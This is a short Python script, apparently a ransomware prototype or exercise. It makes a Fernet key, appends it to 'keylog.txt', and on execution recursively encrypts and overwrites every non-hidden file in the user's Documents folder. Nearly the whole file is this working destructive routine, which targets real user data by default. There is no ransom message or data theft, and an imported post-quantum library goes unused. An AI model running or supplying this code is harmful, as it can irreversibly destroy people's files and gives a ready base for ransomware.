from cryptography.fernet import Fernet
import os
from platformdirs import user_documents_dir
import oqs

# Generates a random 128 bit length key and save it on a file
def keyGen():
    key = Fernet.generate_key()
    file = open("keylog.txt", "ab")
    file.write(key + b"\n") # (binary) Line break to separate keys  
    file.close()
    return key

def encryption(key, folderpath):
    # Creation of Fernet object with the generated key
    f = Fernet(key) 
    # We use os.listdir to do a foreach of its contents
    # If we are looking at a file, we consider it a target, read it and encrypt it where it was
    files = [file for file in os.listdir(folderpath) if not file.startswith('.') and file != 'desktop.ini' and not os.path.isjunction(os.path.join(folderpath, file)) and not os.path.islink(os.path.join(folderpath, file))]
    for filename in files:
        currentPath = os.path.join(folderpath, filename)
        if os.path.isfile(currentPath):
            # Binary reading of a given file
            with open (currentPath, "rb") as file:
                target = file.read()
            # Encryption of read file
            encryptedTarget = f.encrypt(target)
            # Overwrite of read file with its encryption
            with open(currentPath, "wb") as encryptedFile:
                encryptedFile.write(encryptedTarget)
        elif os.path.isdir(currentPath):
            encryption(key,currentPath) # Recursivity for subfolders
# ENCRYPTION OF FOLDER
key = keyGen()
folderpath = user_documents_dir()
print(folderpath)
encryption(key,folderpath)